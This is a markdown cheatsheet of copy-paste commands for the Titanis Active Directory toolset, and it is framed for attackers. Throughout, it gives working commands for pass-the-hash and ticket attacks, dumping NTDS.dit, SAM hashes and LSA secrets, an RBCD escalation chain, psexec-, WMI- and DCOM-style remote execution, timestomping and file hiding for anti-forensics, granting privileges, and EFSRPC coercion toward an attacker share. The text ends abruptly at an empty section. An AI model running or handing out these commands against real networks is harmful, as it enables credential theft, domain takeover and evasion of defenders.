# Titanis-Cheatsheet

This cheatsheet hopes to serve as a practical, copy-paste field reference for [**Titanis**](https://github.com/trustedsec/Titanis), which is a library made by TrustedSec and is cross-platform C# / .NET 8 protocol library and toolset for Windows / Active Directory.
## Why Titanis?

Titanis is stealthier than Impacket in many ways. Enough that it requires its own deep dive and research. I will be releasing a blog post that dives into the exact comparisons between both tools but for now, just know that.

Additionally, Titanis is a lot more reliable. I live this as an excersize to the reader to confirm and analyze : ) 

## Gaps to know about
Not everything from impacket and others are present. Some missing things are:

 - **MS-TSCH** (scheduled tasks / `atexec.py` equivalent) and so you can use WMI `Win32_ScheduledJob` workaround instead
 - **MS-DRSR DCSync / NTDS dumping**: use `impacket secretsdump.py`, `pypykatz smb dcsync`, or whatever you want and then feed hashes back into Titanis for PTH/progress
 - **Ticket forging** (golden/silver/diamond): use `ticketer.py` or another tool.  Note that forged impacket ccache files cannot work or get loaded via `-Tgt` (name-type mismatch). 

## Index

- [Auth Quick Reference](#-auth-quick-reference) 
- [Smb2Client](#-smb2client) 
- [Kerb](#-kerb--kerberos) 
- [Ldap](#-ldap--active-directory) 
- [Lsa](#-lsa--local-security-authority) 
- [Sam](#-sam--security-accounts-manager) 
- [Reg](#-reg--remote-registry) 
- [Scm](#-scm--service-control-manager) 
- [Wmi](#-wmi--windows-management-instrumentation) 
- [Dcom](#-dcom--mmc20-execution) 
- [CredCoerce](#-credcoerce--efsrpc-coercion) 
- [Cert](#-cert--certificates--pkinit) 
- [Sddl / Epm / Misc](#-sddl--epm--misc-helpers)
- [Common Pitfalls & Potential Errors](#-common-pitfalls--errors)

### Set common variables once

```powershell
$DC      = "DC01"                                    # short hostname (preferred for SPNs)
$DC_IP   = "192.168.1.1"
$TARGET  = "FS01"
$T_IP    = "192.168.1.10"
$DOMAIN  = "CORP"                                    # NetBIOS / short name
$REALM   = "CORP.LOCAL"                              # FQDN realm
$USER    = "jdoe"
$UPN     = "$USER@$REALM"
$PASS    = "Password123!"
$HASH    = "A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5"        # NTLM hash
$AES256  = "76332deee4296dcb20200888630755268e605c8576e50ff38db2d8b92351f4e4"
```

This was taken directly out of the fields set/showcased by the Trustedsec repository. Change these to fit your own credentials please xD 

##  Auth Quick Reference

Every Titanis tool accepts the same auth flags and so the common/unified structure for them can be found here and can then be used generally across all the tools

| Scenario                 | Flags                                                                               |
| ------------------------ | ----------------------------------------------------------------------------------- |
| Password (NTLM)          | `-UserName $USER -UserDomain $DOMAIN -Password $PASS`                               |
| Password (Kerberos)      | `-UserName $UPN -Password $PASS -Kdc $DC_IP`                                        |
| Pass-the-Hash            | `-UserName $USER -UserDomain $DOMAIN -NtlmHash $HASH`                               |
| Pass-the-Key (AES256)    | `-UserName $UPN -AesKey $AES256 -Kdc $DC_IP`                                        |
| Pass-the-Ticket (kirbi)  | `-Ticket jdoe.kirbi`                                                                |
| Pass-the-Ticket (ccache) | `-TicketCache jdoe.ccache -Kdc $DC_IP` (Titanis-native ccache only)                 |
| Use `$env:KRB5CCNAME`    | no flag needed as this is something that the Titanis utilities can natively pick up |
| Anonymous                | `-Anonymous`                                                                        |

**Channel security:**

| Flag                  | Effect/Impact                                                  |
| --------------------- | -------------------------------------------------------------- |
| `-EncryptRpc`         | Force RPC packet privacy                                       |
| `-EncryptSmb`         | Force SMB3 encryption end-to-end                               |
| `-RequireSigning`     | This just enforces/requires SMB sigining from the servers side |
| `-UseBackupSemantics` | Smb2Client                                                     |
| `-BackupSemantics`    | (Reg) same idea for registry hive reads                        |
| `-Socks5 host:port`   | Tunnel through SOCKS5                                          |
| `-HostAddress <ip>`   | Connect to IP but keep SPN as hostname (split-DNS / pivoting)  |
| `-PreferSmb`          | Force RPC over SMB named pipe instead of TCP                   |

Note that not every utility supports every one of these flags. For example `Wmi` does not support PreferSmb/EncryptSmb flags. The -EncryptSmb flag will only work if a well known named pipe is avaliable for that protocol. Additionaly, in some protocols; you may find issues trying to combine `-EncryptSm`b/`-PreferSmb` and the `-EncryptRpc` flags. 

## `Smb2Client`

### Test access & enumerate shares

```powershell

Smb2Client ls \\$TARGET\IPC$ -UserName $USER -UserDomain $DOMAIN -Password $PASS

# List shares 
Smb2Client enumshares \\$TARGET -UserName $USER -UserDomain $DOMAIN -Password $PASS

# Anonymous share listing
Smb2Client enumshares \\$TARGET -Anonymous
```

### Browse, download, upload

```powershell
# List files (use -Depth for recursion; -1 = unlimited)
Smb2Client ls \\$TARGET\C$\Users -UserName $USER -UserDomain $DOMAIN -Password $PASS -Depth 2

# Glob across users
Smb2Client ls "\\$TARGET\C$\Users\*\Desktop\*.txt" -u $USER -ud $DOMAIN -p $PASS

# Download a single file
Smb2Client get \\$TARGET\C$\Windows\win.ini .\win.ini -u $USER -ud $DOMAIN -p $PASS

# Download a tree (loot run)
Smb2Client get "\\$TARGET\C$\Users\*\Desktop\*" .\loot -Depth 20 -u $USER -ud $DOMAIN -p $PASS

# Upload
Smb2Client put .\payload.exe \\$TARGET\C$\Windows\Temp\payload.exe -u $USER -ud $DOMAIN -p $PASS

# Delete
Smb2Client rm \\$TARGET\C$\Windows\Temp\payload.exe -u $USER -ud $DOMAIN -p $PASS
```

### Privileged file reads (NTDS.dit, SAM, SYSTEM)

```powershell
# -UseBackupSemantics opens the handle with FILE_FLAG_BACKUP_SEMANTICS
Smb2Client get \\$DC\C$\Windows\NTDS\ntds.dit .\ntds.dit -UserName Administrator -UserDomain $DOMAIN -Password $PASS -UseBackupSemantics

Smb2Client get \\$DC\C$\Windows\System32\config\SYSTEM .\SYSTEM -UserName Administrator -UserDomain $DOMAIN -Password $PASS -UseBackupSemantics
```

### Snapshots, streams, sessions, open files

```powershell
# List VSS snapshots
Smb2Client enumsnapshots \\$TARGET\C$ -u $USER -ud $DOMAIN -p $PASS

# Alternate data streams
Smb2Client enumstreams \\$TARGET\C$\Users\jdoe\file.txt -u $USER -ud $DOMAIN -p $PASS

# Who's logged on (server service RPC) — great for hunting admin sessions
Smb2Client enumsessions \\$TARGET -u $USER -ud $DOMAIN -p $PASS -Level Level502 

# Open files
Smb2Client enumopenfiles \\$TARGET -u $USER -ud $DOMAIN -p $PASS -OpenBy Administrator

# Server NICs (multi-channel SMB recon)
Smb2Client enumnics \\$TARGET\IPC$ -u $USER -ud $DOMAIN -p $PASS
```

### Timestomping & attributes

```powershell
# Match another file's timestamps (anti-forensics)
Smb2Client touch \\$TARGET\C$\Temp\payload.exe -TimestampsFrom \\$TARGET\C$\Windows\notepad.exe -u $USER -ud $DOMAIN -p $PASS

# Set hidden + system + read-only
Smb2Client touch \\$TARGET\C$\Temp\payload.exe -SetAttributes RHS -u $USER -ud $DOMAIN -p $PASS

# Toggle: add Hidden, remove Archive
Smb2Client touch \\$TARGET\C$\Temp\file.txt -UpdateAttributes +H-A -u $USER -ud $DOMAIN -p $PASS
```

Attribute codes: `R` readonly · `H` hidden · `S` system · `A` archive · `T` temporary · `C` compressed · `E` encrypted
### Watch a directory

```powershell
# Live tail filesystem changes
Smb2Client watch \\$TARGET\C$\Windows\Temp -Recursive -u $USER -ud $DOMAIN -p $PASS
```

## `Kerb`

### Probe AS info

```powershell
# Confirms account exists, returns supported enc types + salt(in text and hex) + KDC time
Kerb getasinfo $UPN $DC_IP
```

### Get a TGT (`asreq`)

```powershell
# Password
Kerb asreq -UserName $USER -Realm $DOMAIN -Password $PASS -Kdc $DC_IP 
-OutputFileName jdoe.kirbi -Overwrite

# NTLM hash
Kerb asreq -UserName $USER -Realm $DOMAIN -NtlmHash $HASH -Kdc $DC_IP 
-OutputFileName jdoe.kirbi -Overwrite

# AES256 key
Kerb asreq -UserName $USER -Realm $DOMAIN -AesKey $AES256 -Kdc $DC_IP 
-OutputFileName jdoe.kirbi -Overwrite

# PKINIT (PFX)
Kerb asreq -UserName $UPN -UserCert jdoe.pfx -UserKeyPassword "pfxpass" 
-Kdc $DC_IP -OutputFileName jdoe-pkinit.kirbi -Overwrite

# Force RC4 or any EncType of your choice really
Kerb asreq -UserName $USER -Realm $DOMAIN -Password $PASS -EncTypes Rc4Hmac -Kdc $DC_IP -OutputFileName jdoe-rc4.kirbi -Overwrite

# Output to ccache instead of kirbi
Kerb asreq -UserName $UPN -Password $PASS -Kdc $DC_IP -TicketCache jdoe.ccache
```

### Get a service ticket (`tgsreq`)

```powershell
# Single SPN
Kerb tgsreq -Kdc $DC_IP -Tgt jdoe.kirbi cifs/$TARGET.$REALM -OutputFileName jdoe-cifs.kirbi -Overwrite

# Batch/Request multiple SPNs into one cache
Kerb tgsreq -Kdc $DC_IP -Tgt jdoe.kirbi cifs/$TARGET, host/$TARGET, ldap/$DC -OutputFileName jdoe-services.kirbi -Overwrite

# Let Titanis infer "host/" from a bare hostname
Kerb tgsreq -Kdc $DC_IP -Tgt jdoe.kirbi $TARGET -OutputFileName tkt.kirbi \
-Overwrite
```

### S4U2self + S4U2proxy (constrained delegation abuse)

```powershell
# Combined self+proxy can be preformed in one call to impersonate Administrator to cifs/target
Kerb tgsreq -Kdc $DC_IP -Tgt svc-tgt.kirbi -S4UserName Administrator@$REALM cifs/$TARGET.$REALM -OutputFileName admin-imp-cifs.kirbi -Overwrite

# Then use it directly
Smb2Client ls \\$TARGET\C$ -Tickets admin-imp-cifs.kirbi
```

### Example Of Using Titanis End to End: RBCD Attack Path

```powershell
# (after you have GenericWrite on $VICTIM_COMPUTER and a controlled machine acct $CTRL$)
# 1. Set msDS-AllowedToActOnBehalfOfOtherIdentity on the victim:
Ldap mod $DC_IP "$VICTIM_COMPUTER`$" "msDS-AllowedToActOnBehalfOfOtherIdentity:sddl+=O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<CTRL_SID>)" -u $UPN -p $PASS -Kdc $DC_IP

# 2. Get TGT for the controlled computer account
Kerb asreq -UserName "$CTRL`$" -Realm $DOMAIN -Password $CTRL_PASS -Kdc $DC_IP -OutputFileName ctrl.kirbi -Overwrite

# 3. S4U the victim, impersonating Administrator
Kerb tgsreq -Kdc $DC_IP -Tgt ctrl.kirbi -S4UserName Administrator@$REALM cifs/$VICTIM_COMPUTER.$REALM -OutputFileName victim-admin.kirbi -Overwrite

# 4. Use it
Smb2Client ls \\$VICTIM_COMPUTER\C$ -Tickets victim-admin.kirbi
```

### Renew tickets

```powershell
Kerb renew -Tickets jdoe-cifs.kirbi $DC_IP -OutputFileName jdoe-cifs.kirbi -Overwrite

# Bulk renew a ccache
Kerb renew -TicketCache jdoe.ccache $DC_IP -TargetSpn "host/$TARGET","cifs/$TARGET"
```

### Inspect / merge tickets

```powershell
# Show what's in your loot folder
Kerb select -From "*.kirbi"
Kerb select -From "*.ccache"

# Filter by SPN
Kerb select -From "*.kirbi" -MatchingSpn "krbtgt/.*"
Kerb select -From "*.kirbi" -MatchingSpn ".*/$TARGET"

# Merge everything into one ccache
Kerb select -From "loot/*.kirbi" -Into all.ccache -Overwrite
```

### Derive keys from a password (offline)

```powershell
# Salt = REALM + sAMAccountName
Kerb s2k $PASS "${REALM}${USER}"

# Specific enc types only
Kerb s2k $PASS "${REALM}${USER}" -EncType Aes128CtsHmacSha1_96, Aes256CtsHmacSha1_96

# Machine-account salt = REALM + "host" + lowercase(host.realm). Note this doesnt work on non windows host
Kerb s2k "MachinePassword! "${REALM}host${TARGET.ToLower()}.${REALM.ToLower()}"
```

### Change / set password

```powershell
# Change your own
Kerb changepw $UPN $DC_IP "NewPassw0rd!" -Password $PASS

# Admin reset of another account 
Kerb setpw -UserName $UPN -Kdc $DC_IP -Password $PASS target@$REALM "NewPassw0rd!"
```

### Keytabs

```powershell
Kerb keytab list .\service.keytab
```


## `Ldap`

### Basic Whoami

```powershell
Ldap whoami $DC -u $UPN -p $PASS -Kdc $DC_IP
Ldap whoami $DC -u $UPN -p $PASS -Kdc $DC_IP -Ssl       # LDAPS

# RootDSE & partitions
Ldap query $DC -OutputFields * -OutputStyle List
Ldap lspart $DC -u $UPN -p $PASS -Kdc $DC_IP
```

### Common recon queries

> Some users running Titanis on Linux may need to add `-FollowReferrals` to Ldap queries

```powershell
# All users with key attributes
Ldap query $DC "(objectClass=user)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName, userPrincipalName, memberOf, userAccountControl

# All computers
Ldap query $DC "(objectClass=computer)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields dNSHostName, servicePrincipalName, operatingSystem

# Targets for Kerbaroasting
Ldap query $DC "(&(samAccountType=805306368)(servicePrincipalName=*)(!(sAMAccountName=krbtgt)))" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName, servicePrincipalName

# adminCount=1 (current + historical admins)
Ldap query $DC "(adminCount=1)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields distinguishedName, sAMAccountName, objectSid

# Disabled accounts
Ldap query $DC "(userAccountControl|=AccountDisable)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName

# Accounts with PASSWD_NOTREQD
Ldap query $DC "(userAccountControl|=PasswordNotRequired)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName

# Users with Pre-auth not required (AS-REP roastable)
Ldap query $DC "(&(samAccountType=805306368)(userAccountControl|=DontRequirePreauth))" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName
```

### Delegation hunting

```powershell
# Unconstrained delegation (TRUSTED_FOR_DELEGATION)
Ldap query $DC "(userAccountControl|=TrustedForDelegation)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName, dNSHostName, userAccountControl

# Constrained delegation
Ldap query $DC "(msDS-AllowedToDelegateTo=*)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName, msDS-AllowedToDelegateTo

# Resource-based constrained delegation
Ldap query $DC "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -u $UPN -p $PASS -Kdc $DC_IP -OutputFields sAMAccountName, msDS-AllowedToActOnBehalfOfOtherIdentity

# Constrained delegation w/ protocol transition
Ldap query $DC "(userAccountControl|=TrustedForS4U2self)" -u $UPN -p $PASS -Kdc $DC_IP
```

### Schema & helper commands

```powershell
# All defined bit flags for an attribute
Ldap namedbits userAccountControl

# Convert AD FILETIME timestamps
Ldap timestamp "134182427222091265"
Ldap timestamp "2026-03-17T17:38:42Z"

# Show schema for an attribute
Ldap schema $DC -u $UPN -p $PASS -Kdc $DC_IP -OutputFields ldapDisplayName, attributeID, attributeSyntax
```

### Modify AD objects (DACL / RBCD / UAC abuse)

> Change-syntax: `attr=value` (replace) · `attr+=value` (add) · `attr-=value` (remove) · `attr:file+=path` (load from file) · `attr:sddl+=...` (SDDL convenience)

```powershell
# Add an SPN (Kerberoast self-targeting if you have GenericWrite)
Ldap mod $DC $USER "servicePrincipalName+=HTTP/notreal.$REALM" -u $UPN -p $PASS -Kdc $DC_IP

# Set RBCD (the LDAP step of the full chain shown earlier)
Ldap mod $DC "VICTIM`$" "msDS-AllowedToActOnBehalfOfOtherIdentity:sddl+=O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<CTRL_SID>)" -u $UPN -p $PASS -Kdc $DC_IP

# Configure constrained delegation (need SeEnableDelegationPrivilege, normally DA)
Ldap mod $DC "STEALTH`$" "msDS-AllowedToDelegateTo+=HOST/VICTIM","msDS-AllowedToDelegateTo+=cifs/VICTIM" -u $UPN -p $PASS -Kdc $DC_IP

# Add a userCertificate (Shadow Credentials / msDS-KeyCredentialLink alternatives)
Ldap mod $DC "$USER" "userCertificate:file+=jdoe.cer" -u $UPN -p $PASS -Kdc $DC_IP

# Update an attribute generally
Ldap moduser $DC $USER "description=Owned" "displayName=root" -u $UPN -p $PASS -Kdc $DC_IP
```

### Create new objects

```powershell
# OU
Ldap addou $DC "OU=Pwned,DC=corp,DC=local" -u $UPN -p $PASS -Kdc $DC_IP

# User
Ldap adduser $DC "CN=Test User,OU=Pwned,DC=corp,DC=local" -u $UPN -p $PASS -Kdc $DC_IP -Attributes sAMAccountName=testuser, userPrincipalName=testuser@$REALM

# Computer (MachineAccountQuota default 10 abuse)
Ldap addcomputer $DC "CN=PWN1,CN=Computers,DC=corp,DC=local" -u $UPN -p $PASS -Kdc $DC_IP -Attributes 'sAMAccountName=PWN1$,dNSHostName=pwn1.corp.local'
```

### Watch LDAP in real time

```powershell
Ldap watch $DC -u $UPN -p $PASS -Kdc $DC_IP -Scope Subtree 
```

## `Lsa`

### Identity, translation and lookup proc/utility

```powershell
# Who am I (over LSA RPC)
Lsa whoami $TARGET -u $UPN -p $PASS -Kdc $DC_IP

# Verbose (-v / -vv / -vvv)
Lsa whoami $TARGET -u $UPN -p $PASS -Kdc $DC_IP -vv

# Name → SID
Lsa lookupname $TARGET -u $UPN -p $PASS -Kdc $DC_IP "$DOMAIN\$USER" "Administrators"

# SID → name
Lsa lookupsid $DC -u $UPN -p $PASS -Kdc $DC_IP "S-1-5-32-544" "S-1-5-18"

#-PreferSmb makes lookups go over the named pipe
Lsa lookupsid $DC -PreferSmb -u $UPN -p $PASS -Kdc $DC_IP "S-1-5-21-...-500"
```

Note that sometimes you may have to use the `-PreferSmb` argument as I have faced situations where I get an error using the plain commands and/or using  `-EncryptRpc`:

```bash
Lsa whoami $TARGET -u $UPN -p $PASS -Kdc $DC_IP -EncryptRpc
 INFO: Command completed but no records written
 INFO: Lsa Version 0.9.262.0

System.ComponentModel.Win32Exception (5): ERROR_ACCESS_DENIED (0x00000005): Access is denied. (code=0x00000005)
   at Titanis.DceRpc.Client.RpcClientChannel.SendRequestAsync(RpcRequestBuilder stubData, RpcBindContext context, Boolean includePContext, CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\net\Titanis.DceRpc\Client\RpcClientChannel.cs:line 307
   at Titanis.DceRpc.Client.RpcClientProxy.SendRequestAsync(IRpcRequestBuilder stubData, CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\net\Titanis.DceRpc\Client\RpcClientProxy.cs:line 211
   at ms_lsar.lsarpcClientProxy.LsarGetUserName(String SystemName, RpcPointer`1 UserName, RpcPointer`1 DomainName, CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\net\msrpc\Titanis.Msrpc.Mslsar\ms-lsar.cs:line 3820
   at Titanis.Msrpc.Mslsar.LsaClient.WhoAmI(CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\net\msrpc\Titanis.Msrpc.Mslsar\LsaClient.cs:line 278
   at Titanis.Cli.LsaTool.WhoamiCommand.RunAsync(LsaClient client, CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\tools\rpc\Lsa\WhoamiCommand.cs:line 19
   at Titanis.Cli.RpcCommand.RunAsync(CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\base\Titanis.Cli.DceRpc\RpcCommand.cs:line 50
   at Titanis.Cli.CommandBase.InvokeAsync(ICommandContext context, String command, Token[] args, Int32 startIndex, CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\base\Titanis.Cli\CommandBase.cs:line 66
   at Titanis.Cli.CommandBase.InvokeAsync(ICommandContext context, String command, Token[] args, Int32 startIndex, CancellationToken cancellationToken) in C:\ads-agent\_work\6\s\src\base\Titanis.Cli\CommandBase.cs:line 66
   at Titanis.Cli.CommandBase.RunInternal[TProgram](String[] args) in C:\ads-agent\_work\6\s\src\base\Titanis.Cli\CommandBase.cs:line 192
Tool execution failed with exit code -2147467259 (0x80004005)
```
### Privileges and rights

```powershell
# Get privileges of an account
Lsa getprivs $TARGET -u $UPN -p $PASS -Kdc $DC_IP -ByName Administrators
Lsa getprivs $TARGET -u $UPN -p $PASS -Kdc $DC_IP -BySid "S-1-5-21-...-1001"

# Logon rights (interactive, batch, etc.)
Lsa getrights $TARGET -u $UPN -p $PASS -Kdc $DC_IP -BySid "S-1-5-32-544"

# Who has a specific privilege?
Lsa enumprivaccounts $TARGET -u $UPN -p $PASS -Kdc $DC_IP -Privilege SeDebugPrivilege

# All LSA accounts
Lsa enumaccounts $TARGET -u $UPN -p $PASS -Kdc $DC_IP 
```

### Granting and Adding Privileges 

> On DCs, adding `-PreferSmb` as well as using `-BySid` instead of `-ByName` lookups, is more reliable.

```powershell
# Create an LSA account entry (must exist before you can grant privs to a SID without one)
Lsa createaccount $TARGET -PreferSmb -u $UPN -p $PASS -Kdc $DC_IP "S-1-5-21-...-1001"

# Grant SeDebugPrivilege, SeTcbPrivilege, SeLoadDriverPrivilege
Lsa addpriv $TARGET -PreferSmb -u $UPN -p $PASS -Kdc $DC_IP -BySid "S-1-5-21-...-1001" SeDebugPrivilege SeTcbPrivilege SeLoadDriverPrivilege

# Revoke a single priv (or use * for all)
Lsa rmpriv $TARGET -PreferSmb -u $UPN -p $PASS -Kdc $DC_IP -BySid "S-1-5-21-...-1001" SeTcbPrivilege

# Grant logon rights (e.g., batch logon)
Lsa setsysaccess $TARGET -PreferSmb -u $UPN -p $PASS -Kdc $DC_IP -BySid "S-1-5-21-...-1001" SeBatchLogonRight
```


## `Sam`

```powershell
# Enumerate domain users
Sam enumusers $DC -u $UPN -p $PASS -Kdc $DC_IP

# Extract Specific Fields, in this case fullname of user
Sam enumusers $DC -u $UPN -p $PASS -Kdc $DC_IP -OutputFields FullName 

# Groups
Sam enumgroups $DC -u $UPN -p $PASS -Kdc $DC_IP

# Local aliases (BUILTIN groups on a member server)
Sam enumaliases $TARGET -u $UPN -p $PASS -Kdc $DC_IP

# Members of local Administrators
Sam aliasmembers $TARGET -u "$DOMAIN\$USER" -p $PASS -EncryptRpc 544

# By name(s)
Sam aliasmembers $TARGET -u "$DOMAIN\$USER" -p $PASS -EncryptRpc Administrators,"Backup Operators"
```


## `Reg`

```powershell
# List a key's subkeys
Reg list $TARGET "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -u $UPN -p $PASS -Kdc $DC_IP

# Key metadata (last write time, subkey count, Max class lenght, Value count etc)
Reg keyinfo $TARGET "HKLM\SYSTEM\CurrentControlSet\Services" -u $UPN -p $PASS -Kdc $DC_IP

# Read security descriptor (DACL + owner)
Reg getsd $TARGET "HKLM\SAM" -IncludeDacl -IncludeOwner -u $UPN -p $PASS -Kdc $DC_IP

# Set values — syntax: <type>[:encoding]:<name>=<data>  ;  := sets default value
Reg set $TARGET "HKCU\Software\Pwn" "sz:=DefaultValueData" "dword:Persistence=1" "binary;sddl:Acl=O:BAG:BAD:(A;;0x1F;;;AU)" -u $UPN -p $PASS -Kdc $DC_IP

# Save a hive remotely (writes to remote disk)
Reg save $TARGET "HKLM\SAM" "C:\Windows\Temp\SAM.sav" -u $UPN -p $PASS -Kdc $DC_IP -BackupSemantics
Reg save $TARGET "HKLM\SYSTEM" "C:\Windows\Temp\SYSTEM.sav" -u $UPN -p $PASS -Kdc $DC_IP -BackupSemantics
```

> Note that when using the getsd argument, we would need to use the sddl utility to convert the descriptor into a format that's readable. 

### Dump SAM + LSA secrets

```powershell
# Local SAM hashes
Reg dumpsam $TARGET -u $UPN -p $PASS -Kdc $DC_IP -BackupSemantics

# LSA secrets (machine acct hash, DPAPI keys, cached service creds)
Reg dumplsasecrets $TARGET -u $UPN -p $PASS -Kdc $DC_IP -BackupSemantics

# Boot key alone (for offline parsing of saved hives)
Reg syskey $TARGET -u $UPN -p $PASS -Kdc $DC_IP -BackupSemantics
```

>`-BackupSemantics` is required even as Domain Admin. Without it you will get `ACCESS_DENIED`. Backup Operators can also use this and so no DA membership is actually required.

## `Scm` 

### Enumerate

```powershell
#Get all services on the target
Scm query $TARGET -u $UPN -p $PASS -Kdc $DC_IP

#Specify which fields we want to see from the output results. 
Scm query $TARGET -u $UPN -p $PASS -Kdc $DC_IP -OutputFields <targetField>

#Triggers found 
Scm qtriggers $TARGET Spooler -u $UPN -p $PASS -Kdc $DC_IP                
```

### psexec-style remote execution using Titanis

```powershell
# Create + auto-start a one-shot service that runs your payload, redirect output to a file
Scm create $TARGET pwnsvc "C:\Windows\System32\cmd.exe /c whoami > C:\Windows\Temp\out.txt" -DisplayName "Updater" -Start -u $UPN -p $PASS -Kdc $DC_IP -EncryptRpc

# Retrieve output
Smb2Client get \\$TARGET\C$\Windows\Temp\out.txt .\out.txt -u $UPN -p $PASS -Kdc $DC_IP

# Cleanup
Scm stop   $TARGET pwnsvc -u $UPN -p $PASS -Kdc $DC_IP -EncryptRpc
Scm delete $TARGET pwnsvc -u $UPN -p $PASS -Kdc $DC_IP -EncryptRpc

# Run as another principal
Scm create $TARGET impsvc "C:\Windows\System32\cmd.exe /c whoami" -StartName "$DOMAIN\svc-account" -StartPassword "SvcPass!" -StartType DemandStart -u $UPN -p $PASS -Kdc $DC_IP -EncryptRpc
```

## `Wmi`

### Query

```powershell
Wmi query $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP "SELECT * FROM Win32_Process"

Wmi query $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP -OutputFields Caption, ProcessId, ParentProcessId "SELECT * FROM Win32_Process WHERE Caption LIKE '%lsass%'"

# Get a specific instance
Wmi get $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP "Win32_LogicalDisk.DeviceID='C:'"
```

### Discover what you can call

```powershell
Wmi lsns $TARGET -u $UPN -p $PASS -Kdc $DC_IP                           

#Namespaces
Wmi lsclass $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP

#Classes
Wmi lsmethod $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP Win32_Process
```

### Remote execution Using WMI, `wmiexec`-equivalent

```powershell
# Simple
Wmi exec $TARGET -u $UPN -p $PASS -Kdc $DC_IP -Verbose "whoami /all"

# When using Kerberos, Note: target = short hostname (for SPN), -ha = TCP IP/FQDN
Wmi exec $DC -ha $DC_IP -u $UPN -p $PASS -Kdc $DC_IP -Verbose "hostname"

# With env vars
Wmi exec $TARGET -u $UPN -p $PASS -Kdc $DC_IP -Verbose "echo %TARGETVAR%" -EnvironmentVariables TARGETVAR=value

# Lower-level approach, which may "potentially" be sthealthier
Wmi invoke $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP Win32_Process Create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

# Kill a process
Wmi invoke $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP "Win32_Process.Handle=8008" Terminate
```

### Scheduled-task via WMI

```powershell
# Create a one-shot scheduled job. Note that it is an older API so may have issues
Wmi invoke $TARGET -Namespace root\cimv2 -u $UPN -p $PASS -Kdc $DC_IP Win32_ScheduledJob Create "Command='cmd /c whoami> C:\\Windows\\Temp\\out.txt',StartTime='********143000.000000+000'"
```

## `Dcom`

> Titanis resolves ProgIDs against the **attacker's** registry, not the target's. On Linux there's no registry to resolve. Always pass the raw CLSID GUID.

```powershell
# MMC20.Application, Document.ActiveView.ExecuteShellCommand (4 args: cmd, dir, params, windowstate)
#Note that output isnt returned
Dcom invoke "$TARGET" -u "$UPN" -p "$PASS" -Kdc "$DC_IP" "49B2791A-B1AE-4C90-9B8E-E860BA07F889" "Document.ActiveView.ExecuteShellCommand" "cmd.exe" 'C:\' '/c whoami > C:\Windows\Temp\dcom.txt' "7"

Smb2Client get \\$TARGET\C$\Windows\Temp\dcom.txt .\out.txt -u $UPN -p $PASS -Kdc $DC_IP

# ShellBrowserWindow Navigate is able to launch an exe (no args)
Dcom invoke $TARGET -u $UPN -p $PASS -Kdc $DC_IP "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}" "Navigate" "C:\Windows\System32\cmd.exe"

# Look up the real CLSID on the target first (in case ProgID maps differently)
Reg list $TARGET "HKLM\SOFTWARE\Classes\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}" -u $UPN -p $PASS -Kdc $DC_IP
```


## `CredCoerce` Utility to preform EFSRPC Coercion

```powershell
# Force the target to authenticate to your listener via EFSRPC
CredCoerce $TARGET "\\attacker\share\file.txt" -Techniques Efs.OpenFile -u $UPN -p $PASS -Kdc $DC_IP

# Try ALL implemented techniques
CredCoerce $TARGET "\\attacker\share\file.txt" -Techniques "*" -u $UPN -p $PASS -Kdc $DC_IP

# Anonymous (sometimes works on legacy / unpatched targets)
CredCoerce $TARGET "\\attacker\share\file.txt" -Techniques "*" -Anonymous
```

**Available techniques:** `Efs.OpenFile`, `Efs.EncryptFile`, `Efs.DecryptFile`, `Efs.QueryUsersOnFile`, `Efs.QueryRecoveryAgents`, `Efs.RemoveUsersFromFile`, `Efs.AddUsersToFile`, `Efs.FileKeyInfo`, `Efs.DuplicateEncryptionInfoFile`, `Efs.AddUsersToFileEx`, `Efs.FileKeyInfoEx`, `Efs.GetEncryptedFileMetadata`, `Efs.SetEncryptedFileMetadata`, `Efs.EncryptFileExSrv`

## `Cert`

```powershell
# Self-signed cert + PFX, with UPN in SAN (for PKINIT)
Cert selfcert "CN=$USER" -SubjectAltName "upn=$UPN" -PfxFileName jdoe.pfx -CertFileName jdoe.cer -KeySizeBits 2048 -HashAlgorithm Sha256

# DNS SAN (for SMB / server-side cert testing)
Cert selfcert "CN=$TARGET" -SubjectAltName "dns=$TARGET.$REALM" -PfxFileName srv.pfx -CertFileName srv.pem -HashAlgorithm Sha256

# Use a template cert as a basis (shadow creds, ESC1 chain)
Cert selfcert "CN=$USER" -TemplateFile .\template.cer -SubjectAltName "upn=Administrator@$REALM" -PfxFileName admin.pfx -CertFileName admin.cer

# Then PKINIT with it:
Kerb asreq -UserName "Administrator@$REALM" -UserCert admin.pfx -Kdc $DC_IP -OutputFileName admin.kirbi -Overwrite
```
Cert utlility also has support for other certificate formats as well such as .pem etc 

## `Sddl` / `Epm` / Misc Helpers

```powershell
